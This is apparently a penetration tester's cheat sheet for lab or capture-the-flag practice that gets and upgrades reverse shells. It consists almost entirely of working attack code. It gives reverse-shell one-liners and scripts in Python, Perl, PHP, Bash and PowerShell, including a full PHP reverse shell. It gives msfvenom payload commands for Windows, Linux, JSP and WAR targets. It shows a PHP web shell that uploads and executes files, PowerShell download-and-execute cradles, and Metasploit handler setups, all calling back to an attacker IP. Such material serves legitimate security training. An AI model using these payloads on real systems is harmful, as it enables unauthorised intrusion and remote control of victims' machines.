### Can't Shell?

1. Consider that firewalls may block high ports, so 80/443 are the way to go
2. Consider the application you're trying to use isn't installed, is broken, or has a certain feature disabled
3. If you're having issues transferring the shell due to character restrictions or filenames, remember `wget 10.10.14.37` gets `index.html`

### Python

This works especially well with LFI/RFI attacks, if Python is installed.

```python
# One-liner - Linx
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.37",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```python
# Full Script - Linux
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.37",8000))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
```

```bash
# Full Script - Windows
import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.37",80))

p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
```

### Perl

```perl
# One-liner - Windows/Linux - Change shell cmd
perl -e 'use Socket;$i="10.10.14.37";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Full Script - Windows/Linux - change shell mcd
use Socket;
$i="10.10.14.37";
$p=80;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("cmd.exe");
};
```



### MSFVenom

#### Windows

Windows Meterpreter Payload

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.14.37 LPORT=8000 -f exe -o win_met_revhttp_8000.exe
```

Windows Reverse TCP Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.37 LPORT=80 -f exe -o win_revtcp_80.exe
```

Windows 64-bit specific Reverse TCP Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LPORT=8000 LHOST=10.10.14.37 --platform windows -a x64 --format exe -o winx64revtcp8000.exe
```

Windows HTA file for web servers and VB Script?

```bash
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.37 LPORT=8000 -f hta-psh -o /var/www/html/win_revtcp_8000.hta
```

Microsoft IIS ASP Reverse TCP Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.37 LPORT=8000 -f asp -o reverse_tcp_8000.aspx
```

#### Linux

Linux Meterpreter Payload

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.37 LPORT=8000 -f elf -o lin_met_revhttp_8000.elf
```

Linux Reverse TCP Payload

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.37 LPORT=8000 -f elf -o lin_revtcp_8000.elf
```

Running a payload in BASH (remember to enclose in single quotes)

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.37 LPORT=8000 -f raw
```

ELF-SO File (Linux Linked Libraries)

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.37 LPORT=8000 -f elf-so -o lin_revtcp_8000.so
```



#### JSP

I used this on ColdFusion, the application executes the Java code rather than the Windows system.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.37 LPORT=80 -f raw > rev_jsp_80.jsp
```

#### WAR files

Apache Tomcat's Manager also uses Java as `war` files.  Just use the `war`output format:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.37 LPORT=8000 -f war -o shell.war
```

#### Encoding a Payload

```bash
# Add this to the command
-e x86/shikata_ga_nai -b "\x00"
```

### PHP

With RFI/LFI, you can always start a reverse shell using the PHP cmd script, but you can also just pass it this script and automatically start a reverse shell without needing to pass a command:

NOTE:  If using echo to place this, be sure to escape the proper characters.  From bash, the double quotes need to be escaped.

<u>Linux Reverse Shell</u>

```bash
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.37/8000 0>&1'");?>

# If the code above doesn't work, try it without the &
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.37/8000 0>&1'");?>
```

<u>PHP from CLI</u>

```bash
php -r '$sock=fsockopen("10.10.14.37",8002);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
```

<u>Linux PHP Shell Single Quotes (Pentestmonkey Script One-Liner)</u>

```php
<?php set_time_limit (0); $VERSION = "1.0"; $ip = "10.10.14.37"; $port = 8000; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = "uname -a; w; id; /bin/bash -i"; $daemon = 0; $debug = 0; if (function_exists("pcntl_fork")) { $pid = pcntl_fork(); if ($pid == -1) { printit("ERROR: Cannot fork"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit("Error: Cannot setsid()"); exit(1); } $daemon = 1; } else { printit("WARNING: Failed to daemonise.  This is quite common and not fatal."); } chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit("$errstr ($errno)"); exit(1); } $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit("ERROR: Cannot spawn shell"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) { if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; } if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {  if (!$daemon) { print "$string\n"; } } ?>
```

<u>PHP via remote code</u>

If you are unable to load a full shell into a field, you can use this code to download a shell from your webserver to /tmp/shell.php on the server and execute it using php:

```php
<?php system("wget http://10.10.14.14/shell.txt -O /tmp/shell.php;php /tmp/shell.php");?>
```

<u>Upload and Execute Code (Windows Friendly)</u>

Uploading this code creates two functions, an upload and execute:

```php
<?php if (isset($_REQUEST['fupload'])) {
  file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.37:80/" . $_REQUEST['fupload']));
};

if (isset($_REQUEST['fexec'])) {
  echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
};
?>
```

1. Serve up nc.exe from your machine and download it
   `curl http://10.10.10.9/thepage.php?fupload=nc.exe`
2. Execute and catch shell
   `curl http://10.10.10.9/thepage.php?fexec=nc.exe+10.10.14.37+8000+-e+cmd.exe`

### Bash

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i |nc 10.10.14.37 8001 >/tmp/f

# For LFI passed commands, try this URL encoded if the above doesn't work
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.37 8000 >/tmp/f
```

#### Bash without Netcat

```bash
bash &>/dev/tcp/10.10.14.37/8000 <&1
#OR if running in regular sh and not BASH, if bash exists:
bash -c "bash &>/dev/tcp/10.10.14.37/8000 <&1"
```



### Powershell

<u>One-Liner</u>

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.37',8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

<u>Using Remote Script</u>

1. Start webserver hosting a reverse shell script like Nishang's `Invoke-PowerShellTcp.ps1` (`~/opt/exploits/nishang/Shells/Invoke-PowerShellTcp.ps1`)

2. Modify the script and add the function at the end of it so it will execute:

   ```bash
   sudo vi Invoke-PowerShellTcp.ps1
   # Add
   Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.37 -Port 443
   ```

3. Start a netcat listener & run this command on the target:

   ```bash
   powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.37/shell.ps1')")
   # OR
   cmd.exe /c powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.37/Invoke-PowerShellTcp.ps1')
   ```

### Staged Payloads - Quick Meterpreter Handler

```bash
msfconsole -x "use exploit/multi/handler; set RHOST 10.11.1.226; set PAYLOAD windows/shell/reverse_tcp; set LHOST 10.10.14.37; set LPORT 4444; exploit"

msfconsole -x "use exploit/multi/handler; set RHOST 10.11.1.226; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.14.37; set LPORT 4444; exploit"

msfconsole -x "use exploit/multi/handler; set RHOST 10.11.1.226; set PAYLOAD windows/meterpreter/reverse_nonx_tcp; set LHOST 10.10.14.37; set LPORT 4444; exploit"
```



### MORE SHELLS

AWESOME sheet with almost every type imaginable - https://highon.coffee/blog/reverse-shell-cheat-sheet/

Also a good list - https://sushant747.gitbooks.io/total-oscp-guide/content/reverse-shell.html

## Upgrading Shells

Once a non-interactive shell is obtained (non-tty), try these to upgrade it to a fully interactive shell (pty), with prompts and tab completion.  You can easily tell if you have a tty shell by issuing the `tty` command.

### Quick & Easy

This is the easiest method, but relies on Python being installed.

```python
python -c 'import pty; pty.spawn("/bin/bash")'

# I found this as a way to run bash if you are in a shell spawned through SUID, but this didn't work on the one system I tried
python -c 'import os,pty; os.setresuid(new_id,new_id,new_id); pty.spawn("/bin/bash")'
```

### Alternative Option

These commands basically give your reverse shell the ability to function like a normal bash shell, with tab autocompletions and all that.  In order to do this, you have to be creative and bypass the local shell to send the raw commands to the remote shell (I believe is what is happening)

```bash
SHELL=/bin/bash script -q /dev/null
CTRL+Z
stty raw -echo
#After typing the above, you won't see the next thing you type
fg
reset
xterm
#Press 'ENTER' a couple of times to get the prompt back
```

